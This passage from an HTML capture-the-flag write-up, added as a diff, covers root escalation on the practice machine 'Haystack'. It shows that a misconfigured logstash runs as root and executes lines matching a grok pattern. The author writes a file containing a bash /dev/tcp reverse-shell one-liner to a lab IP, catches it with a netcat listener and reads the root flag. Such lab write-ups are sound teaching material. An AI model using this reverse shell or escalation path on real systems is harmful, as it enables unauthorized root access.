+                -rw-r--r--.&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;kibana&nbsp;1,9K&nbsp;nov&nbsp;28&nbsp;&nbsp;2018&nbsp;jvm.options<br>
+                -rw-r--r--.&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;kibana&nbsp;4,4K&nbsp;sep&nbsp;26&nbsp;&nbsp;2018&nbsp;log4j2.properties<br>
+                -rw-r--r--.&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;kibana&nbsp;&nbsp;342&nbsp;sep&nbsp;26&nbsp;&nbsp;2018&nbsp;logstash-sample.conf<br>
+                -rw-r--r--.&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;kibana&nbsp;8,0K&nbsp;ene&nbsp;23&nbsp;11:59&nbsp;logstash.yml<br>
+                -rw-r--r--.&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;kibana&nbsp;8,0K&nbsp;sep&nbsp;26&nbsp;&nbsp;2018&nbsp;logstash.yml.rpmnew<br>
+                -rw-r--r--.&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;kibana&nbsp;&nbsp;285&nbsp;sep&nbsp;26&nbsp;&nbsp;2018&nbsp;pipelines.yml<br>
+                -rw-------.&nbsp;&nbsp;1&nbsp;kibana&nbsp;kibana&nbsp;1,8K&nbsp;jul&nbsp;15&nbsp;06:17&nbsp;startup.options
+            </div>
+        </div><br>
+        <br>
+        Reading <code>/etc/logstash/startup.options</code> tells us that logstash has been modified to run as root.<br>
+        This strongly implied to me that this is our path to <code>root</code>.<br>
+            <div class="codebox">
+                bash-4.2$&nbsp;cat&nbsp;/etc/logstash/startup.options<br>
+                ...<br>
+                #&nbsp;user&nbsp;and&nbsp;group&nbsp;id&nbsp;to&nbsp;be&nbsp;invoked&nbsp;as<br>
+                #LS_USER=logstash<br>
+                #LS_GROUP=logstash<br>
+                LS_USER=root<br>
+                LS_GROUP=root<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-8" name="h3-8"></a><strong></strong>
+        <h3><strong>5b) /etc/logstash/conf.d</strong></h3><br>
+        In <code>/etc/logstash</code> there's a <code>conf.d</code> directory, which contains a set of configuration files.<br>
+            <div class="codebox">
+                bash-4.2$&nbsp;cd&nbsp;/etc/logstash/conf.d<br>
+                bash-4.2$&nbsp;ls&nbsp;-alh<br>
+                total&nbsp;12K<br>
+                drwxrwxr-x.&nbsp;2&nbsp;root&nbsp;kibana&nbsp;&nbsp;62&nbsp;jun&nbsp;24&nbsp;08:12&nbsp;.<br>
+                drwxr-xr-x.&nbsp;3&nbsp;root&nbsp;root&nbsp;&nbsp;&nbsp;183&nbsp;jun&nbsp;18&nbsp;22:15&nbsp;..<br>
+                -rw-r-----.&nbsp;1&nbsp;root&nbsp;kibana&nbsp;131&nbsp;jun&nbsp;20&nbsp;10:59&nbsp;filter.conf<br>
+                -rw-r-----.&nbsp;1&nbsp;root&nbsp;kibana&nbsp;186&nbsp;jun&nbsp;24&nbsp;08:12&nbsp;input.conf<br>
+                -rw-r-----.&nbsp;1&nbsp;root&nbsp;kibana&nbsp;109&nbsp;jun&nbsp;24&nbsp;08:12&nbsp;output.conf
+            </div>
+        </div><br>
+        <br>
+        There's 2 interesing files - <code>input.conf</code> and <code>filter.conf</code>.<br>
+            <div class="codebox">
+                bash-4.2$&nbsp;cat&nbsp;input.conf<br>
+                input&nbsp;{<br>
+                file&nbsp;{<br>
+                path&nbsp;=&gt;&nbsp;"/opt/kibana/logstash_*"<br>
+                start_position&nbsp;=&gt;&nbsp;"beginning"<br>
+                sincedb_path&nbsp;=&gt;&nbsp;"/dev/null"<br>
+                stat_interval&nbsp;=&gt;&nbsp;"10&nbsp;second"<br>
+                type&nbsp;=&gt;&nbsp;"execute"<br>
+                mode&nbsp;=&gt;&nbsp;"read"<br>
+                }<br>
+                }<br>
+                bash-4.2$&nbsp;cat&nbsp;filter.conf<br>
+                filter&nbsp;{<br>
+                if&nbsp;[type]&nbsp;==&nbsp;"execute"&nbsp;{<br>
+                grok&nbsp;{<br>
+                match&nbsp;=&gt;&nbsp;{&nbsp;"message"&nbsp;=&gt;&nbsp;"Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}"&nbsp;}<br>
+                }<br>
+                }<br>
+                }
+            </div>
+        </div><br>
+        <br>
+        This page explains how these files work - <a href="https://www.elastic.co/guide/en/logstash/current/config-examples.html#_processing_apache_logs">https://www.elastic.co/guide/en/logstash/current/config-examples.html#_processing_apache_logs</a><br>
+        <br>
+        In summary:<br>
+        • <code>input</code> tells <code>filter</code> what files to read<br>
+        • <code>filter</code> contains the patterns to search through the files for<br>
+        <br>
+        <a id="h3-9" name="h3-9"></a><strong></strong>
+        <h3><strong>5c) input.conf and filter.conf</strong></h3><br>
+        <strong>input.conf</strong><br>
+        We can see from <code>input.conf</code> that logstash is taking input from all files named <code>/opt/kibana/logstash_&lt;anything&gt;</code> and treating them as type <code>execute</code><br>
+        • <code>path =&gt; "/opt/kibana/logstash_*"</code><br>
+        • <code>type =&gt; "execute"</code><br>
+        <br>
+            <div class="codebox">
+                bash-4.2$&nbsp;cat&nbsp;input.conf<br>
+                input&nbsp;{<br>
+                file&nbsp;{<br>
+                path&nbsp;=&gt;&nbsp;"/opt/kibana/logstash_*"<br>
+                start_position&nbsp;=&gt;&nbsp;"beginning"<br>
+                sincedb_path&nbsp;=&gt;&nbsp;"/dev/null"<br>
+                stat_interval&nbsp;=&gt;&nbsp;"10&nbsp;second"<br>
+                type&nbsp;=&gt;&nbsp;"execute"<br>
+                mode&nbsp;=&gt;&nbsp;"read"<br>
+                }<br>
+                }
+            </div>
+        </div><br>
+        <br>
+        <strong>filter.conf</strong><br>
+        <code>filter.conf</code> is reading all files where <code>type == execute</code> and searching those files for a line that reads:<br>
+            <div class="codebox">
+                Ejecutar&nbsp;comando:&nbsp;&lt;command&gt;
+            </div>
+        </div><br>
+        and executing that command.<br>
+        <br>
+            <div class="codebox">
+                bash-4.2$&nbsp;cat&nbsp;filter.conf<br>
+                filter&nbsp;{<br>
+                if&nbsp;[type]&nbsp;==&nbsp;"execute"&nbsp;{<br>
+                grok&nbsp;{<br>
+                match&nbsp;=&gt;&nbsp;{&nbsp;"message"&nbsp;=&gt;&nbsp;"Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}"&nbsp;}<br>
+                }<br>
+                }<br>
+                }
+            </div>
+        </div><br>
+        <br>
+        Therefore, to get root we need to create a file in <code>/opt/kibana</code> with the syntax <code>Ejecutar comando: &lt;command&gt;</code> with the command we want to execute. Since logstash is running as root, the command we write will run as root.<br>
+        <br>
+        <a id="h3-10" name="h3-10"></a><strong></strong>
+        <h3><strong>5d) Root!</strong></h3><br>
+        To get root, I chose to create a reverse shell with <code>bash</code>.<br>
+            <div class="codebox">
+                bash-4.2$&nbsp;ls&nbsp;-alh&nbsp;/opt/kibana<br>
+                total&nbsp;0<br>
+                drwxr-x---.&nbsp;2&nbsp;kibana&nbsp;kibana&nbsp;&nbsp;6&nbsp;jul&nbsp;15&nbsp;07:07&nbsp;.<br>
+                drwxr-xr-x.&nbsp;3&nbsp;root&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;20&nbsp;jun&nbsp;18&nbsp;21:20&nbsp;..<br>
+                bash-4.2$&nbsp;echo&nbsp;"Ejecutar&nbsp;comando:&nbsp;bash&nbsp;-i&nbsp;&gt;&amp;&nbsp;/dev/tcp/10.10.14.5/9002&nbsp;0&gt;&amp;1"&nbsp;&gt;&nbsp;/opt/kibana/logstash_pls<br>
+                bash-4.2$&nbsp;ls&nbsp;-alh&nbsp;/opt/kibana<br>
+                total&nbsp;4,0K<br>
+                drwxr-x---.&nbsp;2&nbsp;kibana&nbsp;kibana&nbsp;26&nbsp;jul&nbsp;15&nbsp;07:30&nbsp;.<br>
+                drwxr-xr-x.&nbsp;3&nbsp;root&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;20&nbsp;jun&nbsp;18&nbsp;21:20&nbsp;..<br>
+                -rw-r--r--.&nbsp;1&nbsp;kibana&nbsp;kibana&nbsp;59&nbsp;jul&nbsp;15&nbsp;07:30&nbsp;logstash_pls<br>
+                bash-4.2$&nbsp;cat&nbsp;/opt/kibana/logstash_pls<br>
+                Ejecutar&nbsp;comando:&nbsp;bash&nbsp;-i&nbsp;&gt;&amp;&nbsp;/dev/tcp/10.10.14.5/9002&nbsp;0&gt;&amp;1
+            </div>
+        </div><br>
+        <br>
+        Start a listener on your attacking machine to receive your shell:<br>
+            <div class="codebox">
+                root@gotham:~/ctf/haystack#&nbsp;nc&nbsp;-lvnp&nbsp;9002<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9002&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        And wait... For me, it took a few minutes to get a callback.<br>
+        You should receive a shell! Go read <code>/root/root.txt</code>.<br>
+            <div class="codebox">
+                ...<br>
+                connect&nbsp;to&nbsp;[10.10.14.5]&nbsp;from&nbsp;(UNKNOWN)&nbsp;[10.10.10.115]&nbsp;48334<br>
+                bash:&nbsp;no&nbsp;hay&nbsp;control&nbsp;de&nbsp;trabajos&nbsp;en&nbsp;este&nbsp;shell<br>
+                [root@haystack&nbsp;/]#&nbsp;id<br>
+                id<br>
+                uid=0(root)&nbsp;gid=0(root)&nbsp;grupos=0(root)&nbsp;contexto=system_u:system_r:unconfined_service_t:s0<br>
+                [root@haystack&nbsp;/]#&nbsp;cat&nbsp;/root/root.txt<br>
+                cat&nbsp;/root/root.txt<br>
+                3f5f727...
+            </div>
+        </div><br>
+        <br>
+        <br>
+        <a id="h3-11" name="h3-11"></a><strong></strong>
+        <h3><strong>x) Bonus - Explaining syntax: <br><br>match => { "message" => "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }</strong></h3><br>
+        <code>grok</code> is a logstash plugin that parses arbitrary text - <a href="https://www.elastic.co/guide/en/logstash/current/plugins-filters-grok.html">https://www.elastic.co/guide/en/logstash/current/plugins-filters-grok.html</a><br>
+        • <code>\s</code> is regex for whitespace (i.e. a space, a tab etc.)<br>
+        • <code>%{GREEDYDATA:comando}"</code> is how you define a grok pattern<br>
+        <br>
+        The syntax for grok patterns is <code>%{SYNTAX:SEMANTIC}<br></code>• <code>SYNTAX</code> is the pattern to search your text for - i.e. number/IP address etc.<br>
+        • <code>SEMANTIC</code> is a variable for the data that's being retrieved - i.e. customerID<br>
+        ◇ The <code>GREEDYDATA</code> grok pattern is <code>.*</code> - i.e. anything/everything<br>
+        ◇ <code>comando</code> is the identifier/variable for our command<br>
+        <br>
+        Therefore, <code>Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}"</code> translates plaintext/without the grok syntax as:<br>
+            <div class="codebox">
+                Ejecutar&nbsp;comando:&nbsp;&lt;command&gt;
+            </div>
+        </div>
+    </writeup>
+</section>
+</body>
+</html>
